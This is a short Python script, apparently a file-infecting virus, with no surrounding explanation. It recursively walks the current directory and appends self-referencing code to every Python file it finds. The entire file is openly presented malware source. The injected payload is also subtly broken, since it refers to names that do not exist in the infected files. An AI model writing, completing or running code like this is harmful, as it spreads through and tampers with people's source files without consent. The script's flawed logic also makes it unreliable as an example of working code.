import os
import sys
import shutil

class Virus:
    def __init__(self, file_name):
        self.file_name = file_name
        self.infected_files = []

    def infect(self, file_path):
        if file_path.endswith(".py") and file_path != self.file_name:
            with open(file_path, "r") as file:
                content = file.read()
            if "import virus" not in content:
                with open(file_path, "w") as file:
                    file.write(content + "\nimport virus\n\nvirus = Virus(r'" + file_path.replace("\\", "\\\\") + "')\nvirus.infect(os.path.dirname(os.path.abspath(file_path)))")
                self.infected_files.append(file_path)

    def spread(self):
        for root, dirs, files in os.walk("."):
            for file in files:
                file_path = os.path.join(root, file)
                self.infect(file_path)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        file_name = sys.argv[1]
    else:
        file_name = "virus.py"
    virus = Virus(file_name)
    virus.spread()
